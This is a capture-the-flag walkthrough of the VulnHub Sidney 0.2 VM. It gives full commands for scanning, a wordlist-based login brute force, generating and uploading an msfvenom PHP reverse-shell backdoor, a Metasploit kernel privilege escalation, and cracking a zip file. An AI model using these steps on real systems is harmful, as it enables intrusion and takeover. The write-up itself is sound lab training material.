<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Sidney VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-sydney-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-09-01T15:15:58+00:00">September 1, 2016</time><time class="updated" datetime="2025-06-10T20:30:40+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we will take up a boot2root challenge by Nightmares.<strong> </strong>We will work on Sidney: 0.2 made by N<strong>ightmares.</strong> This is the third challenge he genially came up with. The VM is set to grab a DHCP lease on boot. As before, gaining root is not the end of this VM. You will need to snag the flag. You can download this VM from –&gt; <a style="color: #000000;" href="https://www.vulnhub.com/entry/sidney-02,149/">https://www.vulnhub.com/entry/sidney-02,149/</a></span></p>
<h3><span style="color: #800000;"><strong>Breaching Methodologies:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">webserver enumeration (view source)</span></li>
<li><span style="color: #000000;">Directory brute-force (dirb)</span></li>
<li><span style="color: #000000;">Generate own Dictionary (crunch)</span></li>
<li><span style="color: #000000;">Login into the admin console</span></li>
<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
<li><span style="color: #000000;">Kernel privilege escalation (Metasploit)</span></li>
<li><span style="color: #000000;">Gain root access</span></li>
<li><span style="color: #000000;">Penetrate for flag.zip</span></li>
<li><span style="color: #000000;">Access Ram and finished the task</span></li>
</ul>
<p><span style="color: #000000;">First things we need to know what IP did the VM got. So naturally, scan the network using:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-u4dqonEtG3Q/WvMjqybkMQI/AAAAAAAAWyY/6DiF2bKPKRkPzf4htOAX31ShhVdPb8F7wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now that we have located our target IP i.e.<strong> 192.168.1.103, </strong>our next step is to scan it.</span></p>
<pre class="lang:default decode:true">nmap -A -p- 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EVvUkXEo6mU/WvMjt4ovEII/AAAAAAAAWzI/_kVwh1A2GYER2__1tJC5n5bmojd0sv-3QCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Upon scanning we know that port number 80 is open that means this IP will open in the browser so let us try and do that.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YG14oG51IT4/WvMju2vMFoI/AAAAAAAAWzU/zLBzEmomvckItD0vRLjz3fr5U5Vuf2DGwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Then we decided to look into its page source.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Ae0KqNytZLA/WvMju8WdmcI/AAAAAAAAWzY/0iWoDbC9FFUSwRmltgWK0hAL4qM2qI9TwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So we opened it in the browser (192.168.1.103/commorode64) and to our luck, we found another page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gr-EkPYSQow/WvMju7T9H2I/AAAAAAAAWzc/-y-dVLBv0_4uhwBiGRcU-NQnmBMlrbSEQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">As you will read the page source you will come to know that username is <strong>robhubbard </strong>and going further you will find some hints about the password i.e. :</span></p>
<ul>
<li><span style="color: #000000;">the password is in lowercase</span></li>
<li><span style="color: #000000;">the password has 3 letters and four digits</span></li>
<li><span style="color: #000000;">and it is related to c=64 sound chip</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8dmc7HWYce8/WvMjvYG7_sI/AAAAAAAAWzg/Ed9murPSViY4EibgjEODM-c3SxdyKJVDwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Then we run dirb for web directory brute-force attack and here it has shown so many directories. But I was interested in index.php and decide to explore it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-t7CuEZtd9oA/WvMjvjuD8wI/AAAAAAAAWzk/8u5N4TsvVCMv4QocU46CLRP5OxXaHyxDwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">So we opened it and as you can see it is asking for username and password. Now, we already know what is the username, we just have to find the password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IDDzINTrp84/WvMjv6cmJyI/AAAAAAAAWzo/ghh6_20z6g4QRfjWuyukN4bazAio4ftRQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Getting the above hints about the password, we first decided to look up <strong>the c=64 sound chip</strong> on Wikipedia. And we found:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7ag1hqfxaCs/WvMjwJakrQI/AAAAAAAAWzs/1N0874zcfcoTAzmFSMvPyouZSGpztbuxACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We knew that password’s first three digits are alphabetic letters and so our best guess is <strong>MOS</strong> is the first three digits of the password.</span></p>
<p><span style="color: #000000;">Now everything falls on the last four digits of the password and finds that we used crunch command.</span></p>
<pre class="lang:default decode:true">crunch 7 7 -t mos%%%% -o /root/Desktop/dict.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-t9b9w25NYQI/WvMjq5mQt1I/AAAAAAAAWyc/j9MtvD0zM6Qj5rEgR5r_dEeC3WLoM2yUwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Crunch will generate your dictionary file.</span></p>
<p><span style="color: #000000;">And then apply dictionary attack using Burp Suite and then it will result in showing you the password as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-5Rp-K1ZUkwA/WvMjq_0clCI/AAAAAAAAWyg/4r74ij8tXZMdZSvnJ_GacnThPL0qjB99ACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now on the index.php page enter the username and password. The following page will open and on this page, you have to upload a malicious php file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vJK4WjIZW2A/WvMjrid43jI/AAAAAAAAWyk/FIpisKnYEkwmu_XbC4WPIRTn9xpnPTaAQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Entering the password you will login to the following page:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tQR-m-iVsAU/WvMjrxSrH2I/AAAAAAAAWyo/KfI2RhJ5VxAten79KEADyTO6BI5s6EGBACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now to generate the said php open the terminal in your Kali and type:</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw</pre>
<p><span style="color: #000000;">Simultaneously start multi handler inside Metasploit framework.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Sm_pFalG-Iw/WvMjsGKffCI/AAAAAAAAWys/hnhsKjHt6XwbReOgSSdxrSWCebrrTsL4QCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Copy the code from <strong>&lt;?php </strong>to <strong>die() </strong>and save it in a file with .php extension. Now upload this file by browsing it on the webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NJZ2464fq9A/WvMjsMkTp8I/AAAAAAAAWyw/K37wcVaYBa0POdIEcuq4KdJYN24Lsu8uwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
<pre class="lang:default decode:true">msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 192.168.1.108
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit</pre>
<p><span style="color: #000000;">From given below image you can observe <strong>meterpreter session 1</strong>. But the task is not finished yet, still, we need to penetrate more for privilege escalation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JVuxVYJXDr8/WvMjsj4DvlI/AAAAAAAAWy0/rjvKT9G5odowbXeTkKEUmgxJiwEbAYCKQCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">By executing <strong>sysinfo</strong> we came to know about the target’s architecture i.e. <strong>kernel 4.4</strong>, and with help of this, we found Metasploit exploit for kernel privilege escalation. Further type following command:   </span></p>
<pre class="lang:default decode:true">use exploit/linux/local/bpf_priv_esc
msf exploit(linux/local/bpf_priv_esc) &gt; set session 1
msf exploit(linux/local/bpf_priv_esc) &gt; set lhost 192.168.1.108
msf exploit(linux/local/bpf_priv_esc) &gt; set lport 8888
msf exploit(linux/local/bpf_priv_esc) &gt; exploit</pre>
<p><span style="color: #000000;">And it will give a 2<sup>nd</sup> meterpreter session with root privilege, now let’s get into the root directory and capture the flag.</span></p>
<pre class="lang:default decode:true">cd /root
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UaxGRqFd_lA/WvMjs4PRMfI/AAAAAAAAWy4/ALzFk9HnQKQr9V23_wrn2n03tUyUUHHpQCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">It gave us a hint.gif file, let’s download it.</span></p>
<pre class="lang:default decode:true">download hint.gif /root/Desktop/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-y5RcN3_EY94/WvMjs1FLIEI/AAAAAAAAWy8/sDqjIkWFG04gJA82vwKskpriG3Bm5XJYgCLcBGAs/s1600/19.1.png"/></span></p>
<p><span style="color: #000000;">So when we opened hint.gif it has shown below image and I was unable to take-out hint from their conversation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HEF34fPlFuw/WvMjtef2NCI/AAAAAAAAWzA/Q20-rcpH-cMn7YYdRMMwWo4EjnysQ_THACLcBGAs/s1600/19.2.png"/></span></p>
<p><span style="color: #000000;">Further, I execute the following command:</span></p>
<pre class="lang:default decode:true">cd .commodor64
ls
cd .miami
ls
cd vice
ls</pre>
<p><span style="color: #000000;">Here is flag.zip file let’s download it on our desktop with help of the following command:</span></p>
<pre class="lang:default decode:true">download flag.zip /root/Desktop/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0mu_eXsP3Lg/WvMjtpigWCI/AAAAAAAAWzE/vW89F7K74_AWqmx6PBGL4387_tfPmqoKgCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">We will apply dictionary attack using rockyou.txt so for this the command is:</span></p>
<pre class="lang:default decode:true ">fcrackzip -vuD -p /usr/share/wordlists/rockyou.txt flag.zip</pre>
<p><span style="color: #000000;">And yes, at last, you have the password. So now unzip the flag.zip by typing:</span></p>
<pre class="lang:default decode:true">unzip flag.zip</pre>
<p><span style="color: #000000;">Then it will ask you the password. Enter the recently obtained password here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-uCWU6bRbtHU/WvMjt5KH-nI/AAAAAAAAWzM/GK2MFsgsn5kvQgyhJdumQn4JQs5GCeNcACLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">And YAY!!!!! We have captured the Flag!!! Enjoy with it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QEaZMvRe0to/WvMjuHhSvuI/AAAAAAAAWzQ/0r7KtqKP4yw9e53E_S4nxQZHlRphDZTAwCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
